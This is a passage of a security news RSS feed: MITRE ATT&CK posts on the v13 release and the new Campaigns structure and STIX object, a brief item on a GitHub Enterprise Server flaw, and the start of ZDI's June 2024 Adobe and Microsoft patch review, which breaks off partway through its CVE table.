domains.</p><h3>Cloud: Now with More Exec and LatMo Coverage</h3><p>We assessed known gaps in the Execution and Lateral Movement tactics of the Cloud matrix and built out additions to address some of the disparities. These changes feature contributions from an ongoing partnership with the Cloud community to better represent behaviors in and against Cloud technologies, as well as reflecting how organizations are using Cloud in their operations. In the coming months, we’ll continue to expand coverage in these not-so-easy-to-capture cloud-related tactics, as well as evaluating where to develop more Exfiltration coverage.</p><p>Our end goal this year is to ensure that everyone can more effectively utilize ATT&amp;CK for Cloud. If you have ideas or contributions to share, please <a href="http://attack@mitre.org/">email us</a> or drift by the #<a href="https://mitreattack.slack.com/archives/C035Z0AL8R0"><strong>cloud_attack</strong></a> channel on the <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">ATT&amp;CK slack</a>.</p><h3>Linux: Making the Penguin a Little More Secure</h3><p>Our Linux team has spent the last few months going through contributions, coordinating with contributors, and navigating through open-source reporting for in-the-wild adversary behaviors. This release includes updated and new Linux-only (sub)techniques that will enhance the Linux defender’s toolset. We’ll continue building out Linux coverage in ATT&amp;CK, as well as gaining a better understanding of the adversaries operating in this space. If you’d like to work with us or to join our very exclusive Linux channel <strong>(#</strong><a href="https://mitreattack.slack.com/archives/C035BUEMMHP"><strong>linux_attack</strong></a>), we’d love to have a conversation.</p><h3>Next Up: v14 and ATT&amp;CKcon</h3><p>We know you’re still trying to catch your breath from all the v13 adjustments, but we’re still sprinting for v14! October’s release will feature upgraded coverage across domains, renovated mitigations, new cross-domain mappings, more pseudocodes, and Mobile structured detections.</p><p>We’ll also be releasing more details on ATT&amp;CKCon 4.0 soon (October 24–25), so start getting ready with some light reading/watching of previous <a href="https://attack.mitre.org/resources/attackcon/">ATT&amp;CKcon</a> presentations or couch interviews.</p><p>As always, we look forward to connecting with you on <a href="mailto:attack@mitre.org">email</a>, <a href="https://twitter.com/MITREattack?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Twitter</a>, or <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">Slack</a>.</p><p>©2023 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 22–00745–1</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=5cef174c32ff" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/attack-v13-enters-the-room-5cef174c32ff">ATT&amp;CK v13 Enters the Room</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2023-04-25T14:56:21.249Z</pubDate>
</item>
<item>
<title>Introducing ATT&amp;CK Campaigns</title>
<link>https://medium.com/mitre-attack/introducing-attack-campaigns-6b15baa6cbb4?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/introducing-attack-campaigns-6b15baa6cbb4?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*_CSbbgPWimTXkEud2wxlIA.png" /></figure><h3><strong>Introducing Campaigns to MITRE ATT&amp;CK</strong></h3><p><strong><em>By: </em></strong><em>Amy Robertson, Jared Ondricek, and Matt Malone</em></p><p>We’ve talked about building Campaigns into ATT&amp;CK in our A<a href="https://medium.com/mitre-attack/attack-2022-roadmap-cd5a1a3387c7">TT&amp;CK 2022 roadmap</a>, at <a href="https://www.youtube.com/watch?v=yP0upd-65Yc&amp;list=PLkTApXQou_8Jo2B27kq62Md4bypcBqBAw&amp;index=13">ATT&amp;CKCon 3.0</a>, and most recently on the <a href="https://www.youtube.com/watch?v=Jd2yLBfg8xE">SANS Threat Analysis Rundown</a> but their release is now nigh! Our initial collection of Campaigns will be available starting with our ATT&amp;CK v12 release on October 25, when you’ll be able to leverage the Campaigns structure for all of your ATT&amp;CK use cases. Prior to the release, we’re taking the opportunity to walk you through our vision for Campaigns, give you a tour of Campaigns elements, and cover our longer-term Campaigns plans.</p><p><strong>The Campaigns Vision</strong></p><p>For our purposes in ATT&amp;CK, we use “Campaigns” to describe a grouping of intrusion activity conducted over a specific period of time with common targets and objectives. A key aspect of Campaigns is that the activity may or may not be linked to a specific threat actor.</p><p>Our vision for Campaigns is to provide users with another way to view the evolution of malicious cyber operations. Threat actor activity in ATT&amp;CK currently encompasses a broad set of behaviors that can inform a holistic picture of the adversary over time. But as adversaries evolve, their TTPs often change, and by introducing some structure with Campaigns, we hope to allow you to glean more actionable intelligence and context to inform your defense prioritization<strong>. </strong>Campaigns will enable you to identify trends, track significant changes in techniques used by various actors, and monitor the introduction of new capabilities (or exploited vulnerabilities). You’ll also be able to identify continued threat actor reliance on certain techniques regardless of the campaign objective and/or targets.</p><p>Campaigns will also allow us to more accurately categorize complex intrusion activity, including those involving multiple threats (such as Ransomware-as-a-Service operations) and parse out overlapping operations that have been given the same name. With the new structure, we’ll also be converting some of the Groups in ATT&amp;CK to Campaigns. This will apply to Groups that meet our definition of a Campaign and only feature one cluster of activity (such as G0101/Frankenstein and G0014/Night Dragon).</p><p>As is our tradition of carefully integrating structural elements in ATT&amp;CK, we’ll be incorporating a limited number of Campaigns into the v12 release. This initial collection of Campaigns will feature former Group entries that are more accurately categorized as Campaigns, a curated number of Campaigns linked to existing Groups, as well as unattributed Campaigns.</p><p><strong>Campaign Elements</strong></p><p>We structured Campaigns to visually align with Groups and Software pages, and the v12 release will feature an addition of a new “Campaigns” button on the main page tool bar for easy access.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/649/1*rRkWQX7KklJV1lZ0H9pEhQ.png" /><figcaption><em>Figure 1: Example of the new ATT&amp;CK tool bar with the “Campaigns” button.</em></figcaption></figure><p>The Campaigns homepage will include a Campaigns table featuring ID number, Name, and activity descriptions. The list of available Campaigns in the left column highlights the Campaigns added or converted to date. As we previously covered, we created some flexibility in terms of whether or not the activity was given a unique name — a limitation we currently face with Groups — by allowing a Campaign to be simply referenced by our own identifier (e.g., C0014) if it doesn’t already come with a name.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/958/1*VpfouMBhClv5Zek8VGelyg.png" /><figcaption><em>Figure 2: A draft Campaign table, with unnamed activity referenced as C0014.</em></figcaption></figure><p>Each Campaign entry will feature a description of the intrusion activity, including details like known targeted countries and sectors where available, as well as any information that makes this Campaign particularly noteworthy.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*4gW0dKk2KpkpJTTq2HvYtw.png" /><figcaption><em>Figure 3: A draft Campaign page for all of the Trekkies out there!</em></figcaption></figure><p>Something we’ve been particularly mindful of is how to best capture the period of time related to a Campaign. We opted for the “First Seen” and “Last Seen” fields in the information box, with the corresponding reference citations, so users can see how a Campaign was scoped. For intrusion activity assessed to be ongoing at the time of report publication, we’ll add language to that affect in the Campaign description (e.g., “As of September 2022 security researchers assessed this activity was ongoing”) and update future versions of ATT&amp;CK Campaign entries accordingly.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/702/1*hFnZT2dOn2qoueCEwvBA9g.png" /><figcaption><em>Figure 4: An example Campaigns information box with time frame fields and citations.</em></figcaption></figure><p>As with Groups and Software, we’ve created a “Techniques Used” table to capture actor procedure examples observed during a Campaign, with a couple of significant differences.</p><p>1. We’ll add as much detail as reporting allows regarding specific commands or steps taken by the actors, to help ATT&amp;CK users identify corresponding detection and mitigation opportunities. We’ve found this concept to be more challenging for Group and Software pages, as those tend to aggregate a variety of reporting examples over time, resulting in more generic procedure example language.</p><p>2. We’ll preface our Campaign procedure examples with the Campaign name or associated ID number, to separate it from techniques already found on a Group page. We realize the utility of this may not be immediately evident while looking at a Campaign page, but this allows for the procedure examples to stand out separately when a Campaign is associated with a Group (and, hopefully, allows for smoother integration in the future if an unattributed Campaign is later attributed to a Group).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/790/1*Od0xrpCbicBcN1AeD8S18w.png" /><figcaption><em>Figure 5: Separate procedure examples as seen from a Group page, based on a fictional Campaign. The top line is the existing procedure example for T1566.001 for a Group, while the second line is specifically related to the associated Campaign.</em></figcaption></figure><p><strong>What does this mean for Groups and Software?</strong></p><p>We’ve made two key changes to Group and Software pages as they relate to Campaigns. As previously mentioned, techniques and corresponding procedure examples mapped to a Group-attributed Campaign will carry over to the associated Group page. We’ll also continue to map Campaign-specific procedure examples to Software pages.</p><p>We’ve added a Campaigns table to associated Group and Software pages, so ATT&amp;CK users can easily reference Campaign ID numbers, Names (when applicable), and the Campaign description.</p><p>Group and Software pages will otherwise remain visually unchanged, and we’ll continue to update them separately as a collective list of all observed techniques. We want to preserve the functionality of ATT&amp;CK Navigator Layers in that respect, for ATT&amp;CK users who want to focus on all techniques used regardless of time or target.</p><p><strong>Introducing the Campaign STIX Object</strong></p><p>With the addition of Campaigns to ATT&amp;CK, the ATT&amp;CK Data Model (which can be found in our <a href="https://github.com/mitre/cti/blob/master/USAGE.md#the-attck-data-model">Usage document</a>), has expanded to encompass these changes. The diagram below portrays how all the moving pieces work together, with the new additions of the Campaign object type and the Relationships connected to Campaigns. It’s important to note, there are no changes to objects that previously existed in ATT&amp;CK. Software written to read earlier versions of ATT&amp;CK should continue to work, albeit missing data that only appears in Campaigns.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*jVbUes3GwidA_ionbx6hbw.png" /><figcaption>Figure 6: Campaign STIX relationships</figcaption></figure><p>Now that you’ve seen our data model, we’d like to introduce you to the star of the show — the <a href="http://docs.oasis-open.org/cti/stix/v2.0/csprd01/part2-stix-objects/stix-v2.0-csprd01-part2-stix-objects.html#_Toc476230925">STIX Campaign object</a>. As a part of the ATT&amp;CK Data Model, it makes use of the same STIX extensions that can be found there, such as x_mitre_version. However, in addition to those previously documented fields, here is the breakdown of how ATT&amp;CK utilizes each field that is unique to the Campaign object:<br /> <br /> Standard STIX fields:</p><ul><li>type: Follows the STIX specification</li><li>name: The name used to identify the Campaign. If no name is given, then this field will contain an ATT&amp;CK identifier in the form CXXXX</li><li>description: Follows the STIX specification</li><li>aliases: Used to hold associated Campaign names</li><li>first_seen (timestamp): The time frame that this Campaign was first seen. ATT&amp;CK makes use of this field only to the level of granularity of month/year. The day and time part of this timestamp field should be ignored by parsers when displaying ATT&amp;CK Campaign information</li><li>last_seen (timestamp): The time that this Campaign was last seen or reported. ATT&amp;CK makes use of this field only to the level of granularity of month/year. The day and time part of this timestamp field should be ignored by parsers when displaying ATT&amp;CK Campaign information</li><li>objective: Not used by ATT&amp;CK</li></ul><p>Extensions of the STIX Spec:</p><ul><li>x_mitre_first_seen_citation (string): One to many citations for when the Campaign was first reported in the form “(Citation: &lt;citation name&gt;)” where &lt;citation name&gt; can be found as one of the source_name of one of the external_references.</li><li>x_mitre_last_seen_citation (string): One to many citations for when the Campaign was last reported in the form “(Citation: &lt;citation name&gt;)” where &lt;citation name&gt; can be found as one of the source_name of one of the external_references.</li></ul><p>As mentioned above, we have also added <strong>three new STIX Relationships</strong> that connect Campaigns to the rest of the ecosystem; namely that Campaigns can optionally be <strong>attributed to a Group, use Software, or use Techniques</strong>. The STIX Relationship objects themselves have no special modifications from the STIX standard and simply connect Campaigns to those previously existing objects. At a glance this seems straightforward enough, but there are some things to be aware of if you are parsing ATT&amp;CK v12 STIX going forward.</p><p>When gathering data about Groups that have Campaigns attributed to them, it’s a bit more complex to parse out all the Techniques and Software that are used by the Group. For Campaigns associated with a Group, we won’t be creating relationships between techniques and Software in that Campaign and the Group, if you would like to view the inclusive list, you’ll need to combine technique sets and Software usage.</p><p><strong>Combining Technique Sets: </strong>To get a comprehensive Group Technique view, you’ll need to combine the set of Techniques that are directly used by the Group with the set of Techniques used by all of their associated Campaigns.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/638/1*1k6NxIMlGneRco1xvLe_1w.png" /><figcaption>Figure 7: Example of Group Technique STIX inheritance</figcaption></figure><p><strong>Mapping Software Object Usage:</strong> To holistically map out Software object usage, you’ll identify the Groups, the Group-attributed Campaigns, and the unattributed Campaigns using the Software, and combine them for the full picture.</p><p>For further technical details on how to handle retrieving all Techniques or Software that a Group uses starting with the v12 release and how it differs from the v11 and prior releases, please refer to the <a href="https://github.com/mitre/cti/blob/master/USAGE.md#relationships-microlibrary">Relationships Microlibrary</a> section of the <a href="https://github.com/mitre/cti/blob/master/USAGE.md">GitHub Usage</a> document.</p><p><strong>What to Expect Going Forward</strong></p><p>We’ll continue modifying and building out Campaigns, with the eventual goal of revisiting a major Group pages in ATT&amp;CK and reconstructing earlier Campaigns to reflect how these actors have evolved over time. We’ll also shift focus from one-off or unattributed Campaigns to more complex Campaigns attributed to some of the more populated Group entries, such as the SolarWinds intrusion and <a href="https://attack.mitre.org/groups/G0016/">G0016/APT29</a>.</p><p>Campaigns will also serve a key role in tying together the various ATT&amp;CK matrices — Enterprise (Cloud, Containers, macOS, and Linux), Mobile, and ICS, to further document how adversaries pivot across these domains using a variety of techniques to accomplish their objectives.</p><p>We greatly appreciate the community’s feedback on Campaigns to date, and as we continue to develop Campaigns, we welcome your input. Our Contributions page will be updated in the near future to include more detailed guidance and we look forward to connecting with you via <a href="http://attack@mitre.org">email</a>, <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">Slack</a>, or <a href="https://twitter.com/mitreattack">Twitter</a>.</p><p>©2022 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 22–00744–13.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=6b15baa6cbb4" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/introducing-attack-campaigns-6b15baa6cbb4">Introducing ATT&amp;CK Campaigns</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2023-01-11T20:35:41.083Z</pubDate>
</item>
<item>
<title>GitHub Patches Critical Security Flaw in Enterprise Server Granting Admin Privileges</title>
<link>https://thehackernews.com/2024/08/github-patches-critical-security-flaw.html</link>
<guid>https://thehackernews.com/2024/08/github-patches-critical-security-flaw.html</guid>
<content:encoded><![CDATA[
GitHub has released fixes to address a set of three security flaws impacting its Enterprise Server product, including one critical bug that could be abused to gain site administrator privileges.
The most severe of the shortcomings has been assigned the CVE identifier CVE-2024-6800, and carries a CVSS score of 9.5.
"On GitHub Enterprise Server instances that use SAML single sign-on (SSO)
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 10:18:00 +0530</pubDate>
</item>
<item>
<title>The June 2024 Security Update Review</title>
<link>https://www.thezdi.com/blog/2024/6/11/the-june-2024-security-update-review</link>
<guid>https://www.thezdi.com/blog/2024/6/11/the-june-2024-security-update-review</guid>
<content:encoded><![CDATA[
<p class="">Somehow, we’ve made it to the sixth patch Tuesday of 2024, and Microsoft and Adobe have released their regularly scheduled updates. Take a break from your regular activities and join us as we review the details of their latest security alerts. If you’d rather watch the full video recap covering the entire release, you can check it out here:</p>





















  
  






  <p class=""><strong>Adobe Patches for June 2024</strong></p><p class="">For June, Adobe released 10 patches addressing 165(!) CVEs in Adobe Cold Fusion, Photoshop, &nbsp;Experience Manager, Audition, Media Encoder, FrameMaker Publishing Server, Adobe Commerce, Substance 3D Stager, Creative Cloud Desktop, and Acrobat Android. The fix for <a href="https://helpx.adobe.com/security/products/experience-manager/apsb24-28.html">Experience Manager</a> is by far the largest with a whopping 143 CVEs addressed. However, all but one of these bugs are simply cross-site scripting (XSS) vulnerabilities. The patch for <a href="https://helpx.adobe.com/security/products/coldfusion/apsb24-41.html">Cold Fusion</a> fixes two bugs, but neither are code execution bugs. That’s the same case for the patch addressing bugs in <a href="https://helpx.adobe.com/security/products/audition/apsb24-32.html">Audition</a>. The fix for <a href="https://helpx.adobe.com/security/products/media-encoder/apsb24-34.html">Media Encoder</a> has a single OOB Read memory leak fixed. The update for <a href="https://helpx.adobe.com/security/products/photoshop/apsb24-27.html">Photoshop</a> also has just one bug – a Critical-rated code execution issue. That’s also the story for the <a href="https://helpx.adobe.com/security/products/substance3d_stager/apsb24-43.html">Substance 3D Stager</a> patch.</p><p class="">The patch for <a href="https://helpx.adobe.com/security/products/framemaker-publishing-server/apsb24-38.html">FrameMaker Publishing Server</a> has only two bugs, but one is a CVSS 10 and the other is a 9.8. If you’re using this product, this should be the first patch you test and deploy. The patch for <a href="https://helpx.adobe.com/security/products/magento/apsb24-40.html">Commerce</a> should also be high on your test-and-deploy list as it corrects 10 bugs, including some Critical-rated code execution vulns. The patch for <a href="https://helpx.adobe.com/security/products/creative-cloud/apsb24-44.html">Creative Cloud Desktop</a> fixes a single code execution bug. Finally, the patch for <a href="https://helpx.adobe.com/security/products/acrobat-android/apsb24-50.html">Acrobat Android</a> corrects two security feature bypasses.</p><p class="">None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3.</p><p class=""><strong>Microsoft Patches for June 2024</strong></p><p class="">This month, Microsoft released 49 CVEs in Windows and Windows Components; Office and Office Components; Azure; Dynamics Business Central; and Visual Studio. If you include the third-party CVEs being documented this month, the CVE count comes to 58. A total of eight of these bugs came through the ZDI program, and that does include some of the cases reported during the Pwn2Own Vancouver contest in March.</p><p class="">Of the new patches released today, only one is rated Critical, and 48 are rated Important in severity. This release is another small release when compared to the monster that was April. </p><p class="">Only one of the CVEs listed today is listed as publicly known, but that’s actually just a third-party update that’s now being integrated into Microsoft products. Nothing is listed as being under active attack. Let’s take a closer look at some of the more interesting updates for this month, starting with the lone Critical-rated patch for this month:</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30080" target="_blank"><strong>CVE-2024-30080</strong></a><strong> – Microsoft Message Queuing (MSMQ) Remote Code Execution Vulnerability<br /></strong>This update receives a CVSS rating of 9.8 and would allow remote, unauthenticated attackers to execute arbitrary code with elevated privileges of systems where MSMQ is enabled. That makes this wormable between those servers, but not to systems where MSMQ is disabled. This is similar to the “<a href="https://www.helpnetsecurity.com/2023/04/11/cve-2023-28252/" target="_blank">QueueJumper</a>” vulnerability from last year, but it’s not clear how many affected systems are exposed to the internet. While it is likely a low number, now would be a good time to audit your networks to ensure TCP port 1801 is not reachable. &nbsp;</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30103" target="_blank"><strong>CVE-2024-30103</strong></a><strong> – Microsoft Outlook Remote Code Execution Vulnerability<br /></strong>This patch corrects a bug that allows attackers to bypass Outlook registry block lists and enable the creation of malicious DLL files. While not explicitly stated, attackers would likely then use the malicious DLL files to perform some form of DLL hijacking for further compromise. The good news here is that the attacker would need valid Exchange credentials to perform this attack. The bad news is that the exploit can occur in the Preview Pane. Considering how often credentials end up being sold in underground forums, I would not ignore this fix. &nbsp;</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30078" target="_blank"><strong>CVE-2024-30078</strong></a><strong> – Windows Wi-Fi Driver Remote Code Execution Vulnerability<br /></strong>This vulnerability allows an unauthenticated attacker to execute code on an affected system by sending the target a specially crafted network packet. Obviously, the target would need to be in Wi-Fi range of the attacker and using a Wi-Fi adapter, but that’s the only restriction. Microsoft rates this as “exploitation less likely” but considering it hits every supported version of Windows, it will likely draw a lot of attention from attackers and red teams alike. </p><p class="">Here’s the full list of CVEs released by Microsoft for June 2024:</p>





















  
  
























<table border="0" cellpadding="0" cellspacing="0" width="953">
 <col class="xl70" width="151" />
 <col class="xl73" width="263" />
 <col class="xl72" span="4" width="111" />
 <col class="xl72" width="95" />
 <tr height="48">
  <td class="xl65" height="48" width="151"><span> </span>CVE<span> </span></td>
  <td class="xl66" width="263"><span> </span>Title<span> </span></td>
  <td class="xl67" width="111"><span> </span>Severity<span> </span></td>
  <td class="xl67" width="111"><span> </span>CVSS<span> </span></td>
  <td class="xl67" width="111"><span> </span>Public</td>
  <td class="xl67" width="111"><span> </span>Exploited<span> </span></td>
  <td class="xl67" width="95"><span> </span>Type<span> </span></td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30080"><span><span> </span>CVE-2024-30080</span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Message Queuing (MSMQ) Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl74"><span> </span>Critical<span> </span></td>
  <td class="xl67">9.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255"><span><span> </span>CVE-2024-35255<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Identity Libraries and Microsoft
  Authentication Library Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35254"><span><span> </span>CVE-2024-35254 †</span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Monitor Agent Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.1</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-37325"><span><span> </span>CVE-2024-37325 †</span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Science Virtual Machine (DSVM)
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">9.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35252"><span><span> </span>CVE-2024-35252<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Storage Movement Client Library Denial
  of Service Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30070"><span><span> </span>CVE-2024-30070<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>DHCP Server Service Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29187"><span><span> </span>CVE-2024-29187 *</span></a></td>
  <td class="xl66" width="263"><span> </span>GitHub: CVE-2024-29187 WiX Burn-based
  bundles are vulnerable to binary hijack when run as SYSTEM<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35253"><span><span> </span>CVE-2024-35253<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Azure File Sync Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">4.4</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35263"><span><span> </span>CVE-2024-35263<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Dynamics 365 (On-Premises)
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35248"><span><span> </span>CVE-2024-35248<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Dynamics 365 Business Central
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35249"><span><span> </span>CVE-2024-35249<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Dynamics 365 Business Central
  Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30072"><span><span> </span>CVE-2024-30072<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Event Trace Log File Parsing
  Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30104"><span><span> </span>CVE-2024-30104<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Office Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30101"><span><span> </span>CVE-2024-30101<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Office Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30102"><span><span> </span>CVE-2024-30102<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Office Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30103"><span><span> </span>CVE-2024-30103<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Outlook Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30100"><span><span> </span>CVE-2024-30100<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft SharePoint Server Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="101">
  <td class="xl75" height="101"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30097"><span><span> </span>CVE-2024-30097<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Speech Application Programming
  Interface (SAPI) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
